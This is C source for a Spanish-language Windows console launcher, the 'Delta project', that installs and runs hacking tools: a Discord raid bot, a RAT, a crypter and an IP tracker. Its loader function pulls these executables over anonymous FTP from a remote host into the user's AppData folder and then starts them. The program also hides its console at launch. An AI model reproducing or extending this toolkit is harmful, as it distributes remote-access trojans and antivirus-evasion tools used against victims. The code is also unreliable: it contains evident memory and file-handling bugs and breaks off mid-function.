#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <Lmcons.h>


//INICIO
void inicio(int M);
//Aumenta o disminuye el tamaño de la consola
void size_console(int filas, int columnas);
//Oculta o muestra el cursor de la consola
void showscursor(int i);
//Posiciona el cursor -- columna y fila
void gotoxy(int x, int y);
//Elegir --- numero de opciones, columna y fila
int elegir_op(int x_op, int y_op, int num_op, int x, int y);
//Elegir opciones2
int elegir_op2(int x_op, int y_op, int num_op, int x, int y,int op);
//Opciones del menu
void opciones_principal(int OP);
//Alternativa a fopen puro
FILE* RUTA(const char* ruta, const char* modo);
//Opcion 1-4: Usar herramienta
void op_use_tool(const char* name_exe);
//Elimina los archivos tmp basura
void del_tmp();
//Baja las herramientas dle ftp
int loader(int aux[]);
//Opcion 5: Instalar herramientas
void op5_instalar();
//Opcion 6: Desinstalar herramientas
void op6_desinstalar();
//Opcion 7: salir del menu principal
void op8_info();
//Opcion 8: Mostrar las paginas webs
void op7_web(int x, int y);
//Opcion 9: Sobre los creadores y condiciones
void op9_salir();

int main()
{
    HWND omc = FindWindow("ConsoleWindowClass",NULL);
    ShowWindow(omc,0);
    inicio(0);
    ShowWindow(omc,1);
    opciones_principal(elegir_op(50,-1,9,-1,-1));
}

void showscursor(int i){
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_CURSOR_INFO CCI;
    GetConsoleCursorInfo(h,&CCI);
    CCI.bVisible = i;
    SetConsoleCursorInfo(h,&CCI);
}

void inicio(int M)
{
    showscursor(0);
    if(M == 0)
    {
        system("cls");
        system("mode 97,19");
        system("title Delta project - Menu");
        system("color 0A");
    }
    int col = 0, fil = 0;
    if (M == 0 || M == 2)
    {
        gotoxy(0,0);
        printf("                       _                  \n");
        printf("                      /m\\                \n");
        printf("                     /dsy\\               \n");
        printf("                    /dsssy\\              \n");
        printf("                   /hssssss\\             \n");
        printf("                  /hssssssss\\            \n");
        printf("                 /yssss__hsss\\           \n");
        printf("                /ysssy/  \\dsss\\         \n");
        printf("               /ysssy/    \\msss\\        \n");
        printf("              /ssssy/      \\ssss\\       \n");
        printf("             /ssssh/        \\myss\\      \n");
        printf("            /ssssh/    ____  \\ysss\\     \n");
        printf("           /ssssd/   /msssy/  \\ysss\\    \n");
        printf("          /ssssd/   /dssss/    \\hsss\\   \n");
        printf("         /ssssm/   /dssss/______\\shss\\  \n");
        printf("        /sssym/   /hsssssyyyyyyyyyysss\\  \n");
        printf("       /ssssy/   /yssssssssssssssssssss\\ \n");
        printf("      /mmmmm/   /mmmmmmmmmmmmmmmmmmmmmmm\\\n");
    }
    else
    {
        gotoxy(0,0);
        printf("                                            \n"); 
        printf("                                            \n");   
        printf("   : (\\  `.'''```         ```'''-'  /) ;   \n");
        printf("    :  \\                         `./  .'   \n");
        printf("     `.                            :.'      \n");
        printf("       /        _         _        \\       \n");
        printf("      |         0}       {0         |       \n");
        printf("      |         /         \\         |      \n");
        printf("      |        /           \\        |      \n");
        printf("      |       /             \\       |      \n");
        printf("       \\     |      .-.      |     /       \n");
        printf("        `.   | . . /   \\ . . |   .'        \n");
        printf("          `-._\\.'.(     ).'./_.-'          \n");
        printf("               `\'  `._.'  '/'              \n");
        printf("                `. --'-- .'                 \n");
        printf("                  `-...-'                   \n");
        printf("         Hola me llamo mauricio             \n");
        printf("                                            \n"); 
    }
    
    gotoxy(57,0);    
    printf("Loader por Michael Espinoza");
    fil = 2;
    col = 48;
    gotoxy(col,fil);
    printf("[]======================================[]");
    fil ++;
    gotoxy(col,fil);
    printf("| Que desea hacer?                       |");
    fil ++;
    gotoxy(col,fil);
    printf("|========================================|");
    fil ++;
    gotoxy(col,fil);
    printf("|[1]: Usar Discord bot raider            |");
    fil ++;
    gotoxy(col,fil);
    printf("|[2]: Usar RAT                           |");
    fil ++;
    gotoxy(col,fil);
    printf("|[3]: Usar crypter                       |");
    fil ++;
    gotoxy(col,fil);
    printf("|[4]: Usar IP tracker                    |");
    fil ++;
    gotoxy(col,fil);
    printf("|[5]: Instalar y actualizar herramientas |");
    fil ++;
    gotoxy(col,fil);
    printf("|[6]: Desinstalar herramientas           |");
    fil ++;
    gotoxy(col,fil);
    printf("|[7]: Paginas web Delta hacking          |");
    fil ++;
    gotoxy(col,fil);
    printf("|[8]: Sobre los creadores y condiciones  | ");
    fil ++;
    gotoxy(col,fil);
    printf("|[9]: Salir del programa                 |");
    fil ++;
    gotoxy(col,fil);
    printf("[]======================================[]");
    fil ++;
    gotoxy(col,fil);
    printf(">>> ");
    gotoxy(col,fil);
    showscursor(1);
}

void gotoxy(int x, int y){
    HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
    COORD dwpos;
    dwpos.X = x;
    dwpos.Y = y;
    SetConsoleCursorPosition(hcon,dwpos);
}

int elegir_op(int x_op, int y_op, int num_op, int x, int y){

    //Declaramos a la variable de las opciones, iniciada en 1
	int op = 1;
	//Si se pasaron parametros menores de 0, se autoconfigura los valores de las x & y

	CONSOLE_SCREEN_BUFFER_INFO CSBI;
	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
	GetConsoleScreenBufferInfo(hcon,&CSBI);

	if(x < 0)
	{
		x = CSBI.dwCursorPosition.X;
	}
	if(y < 0)
	{
		y = CSBI.dwCursorPosition.Y;
	}

	if(x_op < 0)
	{
		x_op = CSBI.dwCursorPosition.X;
	}
	if (y_op < 0)
	{
		y_op = CSBI.dwCursorPosition.Y-1;
	}
	y_op -= num_op;

	//Imprimimos 
	gotoxy(x,y);
	printf(">>> %d",op);
	gotoxy(x_op,y_op);
	system("pause>nul");
	
	//Ciclo, si se presiona return termina
	//En cada iteracion la variable i se iguala a op
	for(int i = op;GetAsyncKeyState(VK_RETURN) != -32767; i = op)
	{
		//Se espera a la proxima pulsacion
		Sleep(25);
		//Para mejorar el efecto visual usamos el gotoxy
		gotoxy(x_op,y_op);

		//Si se presiono W o UP 
		if(GetAsyncKeyState('W') != 0 || GetAsyncKeyState(VK_UP) != 0)
		{
			//Si op es 1, op se iguala al numero de opciones
			if(op == 1)
			{
				op = num_op;
                if(x_op == 50)
                {
                    inicio(2);
                }
			}
			else
			{
				//Caso contrario, op se resta
				op -= 1;
			}
		}
		else
		{
			//Caso contrario
			//Si se presiono S o DOWN 
			if(GetAsyncKeyState('S') != 0 || GetAsyncKeyState(VK_DOWN) != 0)
			{
				//Si op es igual a el numero de opciones se le iguala a 1
				if(op == num_op)
				{
					op = 1;
                    if(x_op == 50)
                    {
                        inicio(1);
                    }
				}
				else
				{
					//Caso contrario, se suma 1 a op
					op ++;
				}
			}
			else
			{
				//Caso contrario
				//Se inicia un ciclo for para detectar si se presiono una tecla numerica comprendida entre 1 y el numero de opciones
				for(unsigned char key = 49; key < 49 + num_op; key++)
				{
					//Si se encontro lo tecla numerica, a op se le iguala al numero en cuestion
					if(GetAsyncKeyState(key) != 0 && key-48 != i)
					{
						//Key es un unsigned char, para saber el numero de la tecla se le resta 48, pues este es el ascii de la tecla de 0
						op = key - 48;
						break;
					}
				}
			}
		}
		//Si i es diferente de op, significa que se ha tocado una tecla y modificado el valor de op
		if(op != i)
		{
			//Se resta a op y a i para saber cuanto se ha subido o bajado
			//Eso se le suma a y_op y aso cambiamos la posicion de y_op
			y_op = y_op + (op-i);
			gotoxy(x+4,y);
			printf("%d",op);
			//Imprimimos 
			gotoxy(x_op,y_op);
		}
		system("pause>nul");
	}
	//Se presiono return
	return op;
}

int elegir_op2(int x_op, int y_op, int num_op, int x, int y,int op){

	//Si se pasaron parametros menores de 0, se autoconfigura los valores de las x & y

	CONSOLE_SCREEN_BUFFER_INFO CSBI;
	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
	GetConsoleScreenBufferInfo(hcon,&CSBI);

	if(x < 0)
	{
		x = CSBI.dwCursorPosition.X;
	}
	if(y < 0)
	{
		y = CSBI.dwCursorPosition.Y;
	}

	if(x_op < 0)
	{
		x_op = CSBI.dwCursorPosition.X;
	}
	if (y_op < 0)
	{
		y_op = CSBI.dwCursorPosition.Y-1;
	}
	y_op -= num_op;
    y_op += op-1;

	//Imprimimos 
	gotoxy(x,y);
	printf(">>> %d",op);
	gotoxy(x_op,y_op);
	system("pause>nul");
	
	//Ciclo, si se presiona return termina
	//En cada iteracion la variable i se iguala a op
	for(int i = op; GetAsyncKeyState(VK_RETURN) != -32767; i = op)
	{
		//Se espera a la proxima pulsacion
		Sleep(25);
		//Para mejorar el efecto visual usamos el gotoxy
		gotoxy(x_op,y_op);

		//Si se presiono W o UP 
		if(GetAsyncKeyState('W') != 0 || GetAsyncKeyState(VK_UP) != 0)
		{
			//Si op es 1, op se iguala al numero de opciones
			if(op == 1)
			{
				op = num_op;
			}
			else
			{
				//Caso contrario, op se resta
				op -= 1;
			}
		}
		else
		{
			//Caso contrario
			//Si se presiono S o DOWN 
			if(GetAsyncKeyState('S') != 0 || GetAsyncKeyState(VK_DOWN) != 0)
			{
				//Si op es igual a el numero de opciones se le iguala a 1
				if(op == num_op)
				{
					op = 1;
				}
				else
				{
					//Caso contrario, se suma 1 a op
					op ++;
				}
			}
			else
			{
				//Caso contrario
				//Se inicia un ciclo for para detectar si se presiono una tecla numerica comprendida entre 1 y el numero de opciones
				for(unsigned char key = 49; key < 49 + num_op; key++)
				{
					//Si se encontro lo tecla numerica, a op se le iguala al numero en cuestion
					if(GetAsyncKeyState(key) != 0 && key-48 != i)
					{
						//Key es un unsigned char, para saber el numero de la tecla se le resta 48, pues este es el ascii de la tecla de 0
						op = key - 48;
						break;
					}
				}
			}
		}
		//Si i es diferente de op, significa que se ha tocado una tecla y modificado el valor de op
		if(op != i)
		{
			//Se resta a op y a i para saber cuanto se ha subido o bajado
			//Eso se le suma a y_op y aso cambiamos la posicion de y_op
			y_op = y_op + (op-i);
			gotoxy(x+4,y);
			printf("%d",op);
			//Imprimimos 
			gotoxy(x_op,y_op);
		}
		system("pause>nul");
	}
	//Se presiono return
	return op;
}

void opciones_principal(int OP)
{
    switch(OP)
    {
        case 1: 
        op_use_tool("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\raid_bot.exe");
        break;
        case 2: 
        op_use_tool("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\rat.exe");
        break;
        case 3: 
        op_use_tool("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\crypto.exe");
        break;
        case 4: 
        op_use_tool("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\ip_tracker.exe");
        break;
        case 5: 
        op5_instalar();
        break;
        case 6: 
        op6_desinstalar();
        break;
        case 7: 
        op7_web(1,1);
        break;
        case 8: 
        op8_info();
        break;
        case 9: 
        op9_salir();
        break;
    }
    inicio(0);
    opciones_principal(elegir_op(50,-1,9,-1,-1));
}

FILE* RUTA(const char* ruta, const char* modo){
    TCHAR username[UNLEN + 1];
    DWORD size = UNLEN + 1;
    GetUserName((TCHAR*)username,&size);
    char AUX[9+strlen(username)+strlen(ruta)];
    strcpy(AUX,"C:\\Users\\");
    strcat(AUX,username);
    strcat(AUX,ruta);
    char disco[strlen(getenv("USERPROFILE"))];
    strcpy(disco,getenv("USERPROFILE"));
    AUX[0] = disco[0];
    FILE *AUX_F = fopen(AUX,modo);
    fclose(AUX_F);
    return AUX_F;
}

void op_use_tool(const char* name_exe){
    showscursor(0);
    system("cls");
    FILE *exe = RUTA(name_exe,"r");
    if(exe == NULL)
    {
        system("color 0C");
        printf("[?] Usted no ha instalado previamente a la herramienta. Desea instalarla ahora?\n");
        printf("[1]:SI\n[2]:NO\n\n");
        showscursor(1);
        if(elegir_op(1,-1,2,-1,-1) == 1)
        {
            system("color 0A");
            op5_instalar();

        }
    }
    else
    {
        TCHAR username[UNLEN+1];
        DWORD size = UNLEN+1;
        GetUserName((TCHAR*)username,&size);
        char aux[strlen(username)+15];
        strcpy(aux,"start ");
        strcat(aux,"C:\\Users\\");
        strcat(aux,username);
        strcat(aux,name_exe);
        system(aux);
        showscursor(1);
    }
}

void del_tmp(){
    FILE *f = _popen("dir","r");
	FILE *F = fopen("lol.txt","w");
	
	char aux[128], aux_s[] = ".tmp", dir[100000];
	while(!feof(f))
	{
		fgets(aux,128,f);
		strcat(dir,aux);
	}
	
	fclose(F);
	pclose(f);

    char *out, *del;
	for(int i = 0; i < strlen(dir)-4; i++)
	{
		if(dir[i] == '.')
		{
			for(int I = 0; I < 4 && dir[i+I] == aux_s[I] || I == 4; I++)
			{
				if(I == 4)
				{
					I = i+3;
					
					for(; dir[i] != ' '; i-=1);
					
					out = (char*)malloc(sizeof(int)*I-i);
					
					for(int j = 0; j < I-i; j++)
					{
						out[j] = dir[i+1+j];
					}
					del = (char*)malloc(sizeof(int)*strlen(out)+4);
					strcpy(del,"del ");
					strcat(del,out);
					system(del);
					free(del);
					free(out);
					i = I;
				}
			}
		}
	}

}

int loader(int aux[]){
    showscursor(0);
    system("mode 30,1");
    system("cls");

    //Disco
    char disco[strlen(getenv("USERPROFILE"))];
    strcpy(disco,getenv("USERPROFILE"));

    //User
    TCHAR user[UNLEN+1];
    DWORD size = UNLEN+1;
    GetUserName((TCHAR*)user,&size);
            
    //RUTA
    char ruta[strlen(user)+37];
    strcpy(ruta,"C:\\Users\\");
    ruta[0] = disco[0];
    strcat(ruta,user);
    strcat(ruta,"\\AppData\\Roaming\\Delta_tools");            

    //Conectando al ftp
    system("title Espere...");
    FILE* cmd = _popen("ftp\n","w");
    //iniciativadelta.serveftp.com
    fputs("open 192.168.0.105\n",cmd);
    fputs("anonymous\n",cmd);
    fputs("\n",cmd);
    fputs("cd tools\n",cmd);
    fputs("binary\n",cmd);
    
    //Comandos GET(ftp) y MOVE(cmd)
    char *GET, *MOVE;

    MOVE = (char*)malloc(sizeof(int)*strlen(ruta)+32);

    //1 ----> bot raider
    if(aux[0] == 1)
    {
        GET = (char*)malloc(sizeof(int)*30+strlen(ruta));
        strcpy(GET,"GET raid_bot.exe ");
        strcat(GET,ruta);
        strcat(GET,"\\raid_bot.exe\n");
        fputs(GET,cmd);
        free(GET);
    }
    //2 ---> RAT
    if(aux[1] == 1)
    {
        GET = (char*)malloc(sizeof(int)*20+strlen(ruta));
        strcpy(GET,"GET rat.exe ");
        strcat(GET,ruta);
        strcat(GET,"\\rat.exe\n");
        fputs(GET,cmd);
        free(GET);
    }
    //3 -------> crypter
    if(aux[2] == 1)
    {

        GET = (char*)malloc(sizeof(int)*26+strlen(ruta));
        strcpy(GET,"GET crypto.exe ");
        strcat(GET,ruta);
        strcat(GET,"\\crypto.exe\n");
        fputs(GET,cmd);
        free(GET);
    }
   //4 -----> IP tracker
    if(aux[3] == 1)
    {
        GET = (char*)malloc(sizeof(int)*34+strlen(ruta));
        strcpy(GET,"GET ip_tracker.exe ");
        strcat(GET,ruta);
        strcat(GET,"\\ip_tracker.exe\n");
        fputs(GET,cmd);
        free(GET);
    }

    fputs("bye",cmd);

    _pclose(cmd);

    //FINAL

    char out[4] = {0,0,0,0};

    if(aux[0] == 1)
    {
        if(RUTA("\\AppData\\Roaming\\Delta_tools\\raid_bot.exe","r") == NULL)
        {
            out[0]++;
        }
        else
        {
            strcpy(MOVE,"del ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\Ejecutables");
            strcat(MOVE,"\\raid_bot.exe");
            system(MOVE);
            strcpy(MOVE,"MOVE ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\raid_bot.exe ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\Ejecutables");
            system(MOVE);
            if(RUTA("\\AppData\\Roaming\\Delta_tools\\raid_bot.exe","r") != NULL)
            {
                out[0]++;
                strcpy(MOVE,"del ");
                strcat(MOVE,ruta);
                strcat(MOVE,"\\raid_bot.exe");
                system(MOVE);
            }
        }
    }

    if(aux[1] == 1)
    {
        if(RUTA("\\AppData\\Roaming\\Delta_tools\\rat.exe","r") == NULL)
        {
            out[1]++;
        }
        else
        {
            strcpy(MOVE,"del ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\Ejecutables");
            strcat(MOVE,"\\rat.exe");
            system(MOVE);
            strcpy(MOVE,"MOVE ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\rat.exe ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\Ejecutables");
            system(MOVE);
            if(RUTA("\\AppData\\Roaming\\Delta_tools\\rat.exe","r") != NULL)
            {
                out[1]++;
                strcpy(MOVE,"del ");
                strcat(MOVE,ruta);
                strcat(MOVE,"\\rat.exe");
                system(MOVE);
            }
        }
    }

    if(aux[2] == 1)
    {
        if(RUTA("\\AppData\\Roaming\\Delta_tools\\crypto.exe","r") == NULL)
        {
            out[2]++;
        }
        else
        {
            strcpy(MOVE,"del ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\Ejecutables");
            strcat(MOVE,"\\crypto.exe");
            system(MOVE);
            strcpy(MOVE,"MOVE ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\crypto.exe ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\Ejecutables");
            system(MOVE);
            if(RUTA("\\AppData\\Roaming\\Delta_tools\\crypto.exe","r") != NULL)
            {
                out[2]++;
                strcpy(MOVE,"del ");
                strcat(MOVE,ruta);
                strcat(MOVE,"\\crypto.exe");
                system(MOVE);
            }
        }
    }

    if(aux[3] == 1)
    {
        if(RUTA("\\AppData\\Roaming\\Delta_tools\\ip_tracker.exe","r") == NULL)
        {
            out[3]++;
        }
        else
        {
            strcpy(MOVE,"del ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\Ejecutables");
            strcat(MOVE,"\\ip_tracker.exe");
            system(MOVE);
            strcpy(MOVE,"MOVE ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\ip_tracker.exe ");
            strcat(MOVE,ruta);
            strcat(MOVE,"\\Ejecutables");
            system(MOVE);
            if(RUTA("\\AppData\\Roaming\\Delta_tools\\ip_tracker.exe","r") != NULL)
            {
                out[3]++;
                strcpy(MOVE,"del ");
                strcat(MOVE,ruta);
                strcat(MOVE,"\\ip_tracker.exe");
                system(MOVE);
            }
        }
    }
    
    for(int i = 0; i < 4; i++)
    {
        if(aux[i] == out[i] == 1)
        {
            del_tmp();
            break;
        }
    }
    system("title Delta project - Instalar");
    system("mode 97,19");

    if(aux[0] == 1)
    {
        if(out[0] == 1)
        {
            puts("Descarga del Discord bot raider fallida");
        }
        else
        {
            puts("Descarga del Discord bot raider realizada con exito");
        }
    }

    if(aux[1] == 1)
    {
        if(out[1] == 1)
        {
            puts("Descarga del RAT fallida");
        }
        else
        {
            puts("Descarga del RAT realizada con exito");
        }
    }

    if(aux[2] == 1)
    {
        if(out[2] == 1)
        {
            puts("Descarga del Crypter fallida");
        }
        else
        {
            puts("Descarga del Crypter realizada con exito");
        }
    }

    if(aux[3] == 1)
    {
        if(out[3] == 1)
        {
            puts("Descarga del IP tracker fallida");
        }
        else
        {
            puts("Descarga del IP tracker realizada con exito");
        }
    }
    
    showscursor(1);

    system("pause");
    free(MOVE);
}

void op5_instalar(){
    showscursor(0);
    system("cls");
    system("title Delta project - Instalar");
    printf("Elija cuales herramientas va a instalar/actualizar:\n");
    printf("[1]:Discord bot raider\n");
    printf("[2]:RAT\n");
    printf("[3]:Crypter\n");
    printf("[4]:IP tracker\n");
    printf("[5]:Seleccionar todas\n");
    printf("[6]:Continuar\n");
    printf("[7]:Volver al menu \n\n");
    showscursor(1);
    CONSOLE_SCREEN_BUFFER_INFO CSBI, CSBI_aux;
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(h,&CSBI);
    int aux[5] = {0,0,0,0,0};
    for(int OP = elegir_op2(1,-1,7,-1,-1,1);TRUE;OP = elegir_op2(1,-1,7,-1,-1,OP))
    {
        if(OP == 7)
        {
            return;
        }
        else
        {
            if(OP == 6)
            {
                for(int i = 0; i < 4; i ++)
                {
                    if(aux[i] == 1)
                    {
                        OP = -1;
                        break;
                    }
                }
            }
            else
            {
                if(OP == 5)
                {
                    if(aux[4] == 0)
                    {
                        aux[4] = 1;
                        GetConsoleScreenBufferInfo(h,&CSBI_aux);
                        for(int i = 0; i < 4; i++)
                        {
                            aux[i] = 1;
                            gotoxy(CSBI_aux.dwCursorPosition.X,CSBI_aux.dwCursorPosition.Y-4+i);
                            printf("%c",254);
                        }
                        gotoxy(CSBI_aux.dwCursorPosition.X+3,CSBI_aux.dwCursorPosition.Y);
                        printf("Deseleccionar todas");
                    }
                    else
                    {
                        aux[4] = 0;
                        GetConsoleScreenBufferInfo(h,&CSBI_aux);
                        for(int i = 0; i < 4; i++)
                        {
                            aux[i] = 0;
                            gotoxy(CSBI_aux.dwCursorPosition.X,CSBI_aux.dwCursorPosition.Y-4+i);
                            printf("%d",i+1);
                        }
                        gotoxy(CSBI_aux.dwCursorPosition.X+3,CSBI_aux.dwCursorPosition.Y);
                        printf("Seleccionar todas  ");
                    }
                }
                else
                {
                    GetConsoleScreenBufferInfo(h,&CSBI_aux);
                    gotoxy(CSBI_aux.dwCursorPosition.X,CSBI_aux.dwCursorPosition.Y);
                    if(aux[OP-1] == 1)
                    {
                        printf("%d",OP);
                        aux[OP-1] = 0;
                        if(aux[4] == 1)
                        {
                            aux[4] = 0;
                            GetConsoleScreenBufferInfo(h,&CSBI_aux);
                            gotoxy(CSBI_aux.dwCursorPosition.X+2,CSBI_aux.dwCursorPosition.Y+(5-OP));
                            printf("Seleccionar todas  ");
                        }
                    }
                    else
                    {
                        aux[OP-1] = 1;
                        printf("%c",254);
                        if(aux[4] == 0)
                        {
                            for(int i = 0; i < 5 ; i++)
                            {
                                if(i < 4 && aux[i] != 1)
                                {
                                    break;
                                }
                                if(i == 4)
                                {
                                    aux[4] = 1;
                                    GetConsoleScreenBufferInfo(h,&CSBI_aux);
                                    gotoxy(CSBI_aux.dwCursorPosition.X+2,CSBI_aux.dwCursorPosition.Y+(5-OP));
                                    printf("Deseleccionar todas");
                                }
                            }
                        }
                    }
                    gotoxy(CSBI_aux.dwCursorPosition.X,CSBI_aux.dwCursorPosition.Y);
                }
            }
        }
        gotoxy(CSBI.dwCursorPosition.X, CSBI.dwCursorPosition.Y);
        if(OP == -1)
        {
            //Creamos la carpeta
            TCHAR username[UNLEN+1];
            DWORD size = UNLEN +1;
            GetUserName((TCHAR*)username,&size);
            strcat(username,"\\AppData\\Roaming\\Delta_tools\\Ejecutables");
            char comand[strlen(username)+12];
            strcpy(comand,"md C:\\Users\\");
            strcat(comand,username);
            strcpy(username,getenv("USERPROFILE"));
            comand[3] = username[0];
            system(comand);

            //Instalamos los programas
            loader(aux);
            return;
        }
    }
    
}

void op6_desinstalar(){
    showscursor(0);
    system("cls");
    system("title Delta project - Desinstalar");
    printf("Elija cuales va a desinstalar:\n");
    int i = 0, AUX[4] = {0,0,0,0};
    char *ruta;
    FILE *f = RUTA("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\raid_bot.exe","r");
    if(f == NULL)
    {
        i++;
    }
    else
    {
        AUX[0] = 1-i;
        printf("[%d]:Discord bot raider\n",AUX[0]);
    }
    
    f = RUTA("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\rat.exe","r");
    if(f == NULL)
    {
        i++;
    }
    else
    {
        AUX[1] = 2-i;
        printf("[%d]:RAT\n",AUX[1]);
    }
    
    f = RUTA("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\crypto.exe","r");
    if(f == NULL)
    {
        i++;
    }
    else
    {
        AUX[2] = 3-i;
        printf("[%d]:Crypter\n",AUX[2]);
    }
    
    f = RUTA("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\ip_tracker.exe","r");
    if(f == NULL)
    {
        i++;
    }
    else
    {
        AUX[3] = 4-i;
        printf("[%d]:IP tracker\n",AUX[3]);
    }
    
    if(i == 4)
    {
        system("cls");
        system("color 0C");
        printf("No ha instalado ninguna herramienta.\n");
        system("pause");
        return;
    }
    printf("[%d]:Seleccionar todas%c",5-i,'\n');
    printf("[%d]:Desinstalar selecionadas \n",6-i);
    printf("[%d]:Volver al menu %s",7-i,"\n\n");
    showscursor(1);
    CONSOLE_SCREEN_BUFFER_INFO CSBI, CSBI1;
    HANDLE h = GetStdHandle(STD_OUTPUT_HANDLE);
    GetConsoleScreenBufferInfo(h,&CSBI1);
    for(int I[5] = {0,0,0,0,0}, OP = elegir_op2(1,-1,7-i,-1,-1,1) ;TRUE; OP = elegir_op2(1,-1,7-i,-1,-1,OP))
    {
        if(OP == 5-i)
        {
            if(I[4] != 0)
            {
                GetConsoleScreenBufferInfo(h,&CSBI);
                for(int con = 0; con < 4-i; con++)
                {
                    gotoxy(CSBI.dwCursorPosition.X,CSBI.dwCursorPosition.Y-4+i+con);
                    printf("%d",con+1);
                    I[con] = 0;
                }
                I[4] = 0;
                gotoxy(CSBI.dwCursorPosition.X+3,CSBI.dwCursorPosition.Y);
                printf("Seleccionar todas  ");   
            }
            else
            {

                GetConsoleScreenBufferInfo(h,&CSBI);
                for(int con = 0; con < 4-i; con ++)
                {
                    gotoxy(CSBI.dwCursorPosition.X,CSBI.dwCursorPosition.Y-4+i+con);
                    printf("%c",254);
                    I[con] = 1;
                }
                I[4] = 1;
                gotoxy(CSBI.dwCursorPosition.X+3,CSBI.dwCursorPosition.Y);
                printf("Deseleccionar todas");
            }
        }
        else
        {
            if(OP == 6-i)
            {
                for(int con = 0; con < 4-i; con++)
                {
                    if(I[con] == 1)
                    {
                        OP = -1;
                        break;
                    }
                }
            }
            else
            {
                if(I[OP-1] == 1)
                {
                    I[OP-1] = 0;
                    printf("%d",OP);
                    GetConsoleScreenBufferInfo(h,&CSBI);
                    if(I[4] == 1)
                    {
                        gotoxy(CSBI.dwCursorPosition.X+2,CSBI.dwCursorPosition.Y+5-OP);
                        printf("Seleccionar todas  ");
                        I[4] = 0;
                    }
                }
                else
                {
                    I[OP-1] = 1;
                    printf("%c",254);
                    for(int con = 0; con < 5; con ++)
                    {
                        if(con != 4)
                        {
                            if(I[con] != 1)
                            {
                                break;
                            }
                        }
                        else
                        {
                            GetConsoleScreenBufferInfo(h,&CSBI);
                            gotoxy(CSBI.dwCursorPosition.X+2,CSBI.dwCursorPosition.Y+5-OP);
                            printf("Deseleccionar todas");
                            I[4] = 1;
                        }
                    }
                }
            }
        }

        gotoxy(CSBI1.dwCursorPosition.X,CSBI1.dwCursorPosition.Y);
        
        if (OP == 7-i)
        {
            return;
        }
        else
        {
            if(OP == -1)
            {
                TCHAR username[UNLEN + 1];
                DWORD size = UNLEN + 1;
                GetUserName((TCHAR*)username,&size);
                for (char aux[90];TRUE;)
                {
                    showscursor(0);
                    system("cls");
                    //Eliminamos
                    if(I[AUX[0]-1] == 1)
                    {
                        strcpy(aux,"del ");
                        strcat(aux,"C:\\Users\\");
                        strcat(aux,username);
                        strcat(aux,"\\AppData\\Roaming\\Delta_tools\\Ejecutables\\raid_bot.exe");
                        system(aux);
                    }
                    if(I[AUX[1]-1] == 1)
                    {
                        strcpy(aux,"del ");
                        strcat(aux,"C:\\Users\\");
                        strcat(aux,username);
                        strcat(aux,"\\AppData\\Roaming\\Delta_tools\\Ejecutables\\rat.exe");
                        system(aux);
                    }
                    if(I[AUX[2]-1] == 1)
                    {
                        strcpy(aux,"del ");
                        strcat(aux,"C:\\Users\\");
                        strcat(aux,username);
                        strcat(aux,"\\AppData\\Roaming\\Delta_tools\\Ejecutables\\crypto.exe");
                        system(aux);
                    }
                    if(I[AUX[3]-1] == 1)
                    {
                        strcpy(aux,"del ");
                        strcat(aux,"C:\\Users\\");
                        strcat(aux,username);
                        strcat(aux,"\\AppData\\Roaming\\Delta_tools\\Ejecutables\\ip_tracker.exe");
                        system(aux);
                    }
                    system("cls");
                    //Imprimimos
                    if(I[AUX[0]-1] == 1)
                    {
                        if(RUTA("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\raid_bot.exe","r") != NULL)
                        {
                            puts("Desinstalacion fallida del Discord bot raider");
                        }
                        else
                        {
                            puts("Desinstalacion del Discord bot raider realizada con exito");
                        }
                    }
                    if(I[AUX[1]-1] == 1)
                    {
                        if(RUTA("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\rat.exe","r") != NULL)
                        {
                            puts("Desinstalacion fallida del RAT");
                        }
                        else
                        {
                            puts("Desinstalacion del RAT realizada con exito");
                        }
                    }
                    if(I[AUX[2]-1] == 1)
                    {
                        if(RUTA("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\crypto.exe","r") != NULL)
                        {
                            puts("Desinstalacion fallida del Crypter");
                        }
                        else
                        {
                            puts("Desinstalacion del Crypter realizada con exito");
                        }
                    }
                    if(I[AUX[3]-1] == 1)
                    {
                        if(RUTA("\\AppData\\Roaming\\Delta_tools\\Ejecutables\\ip_tracker.exe","r") != NULL)
                        {
                            puts("Desinstalacion fallida del IP tracker");
                        }
                        else
                        {
                            puts("Desinstalacion del IP tracker realizada con exito");
                        }
                    }

                    system("pause");
                    showscursor(1);

                    break;
                }
                break;
            }
        }
    }
}

void op7_web(int x, int y){
    showscursor(0);
    system("cls");
    system("title Delta project menu - Paginas web");
    printf("[]=======================================================================[]\n");
    printf("| [1]: Discord - https://discord.gg/hFpXYxD5Rw                            |\n");
    printf("| [2]: Telegram - https://t.me/ProyectoDeltaOficial                       |\n");
    printf("| [3]: Twitter - https://twitter.com/IniciativaDelta?s=09                 |\n");
    printf("| [4]: YouTube - https://www.youtube.com/channel/UC7-EBSmlyxgGaR4eZz1s9Uw |\n");
    printf("| [5]: Learning - http://deltal.rf.gd                                     |\n");
    printf("| [6]: Seleccionar todos los links                                        |\n");
    printf("| [7]: Abrir seleccionados                                                |\n");
    printf("| [8]: Volver al menu                                                     |\n");
    printf("[]=======================================================================[]\n");
    showscursor(1);
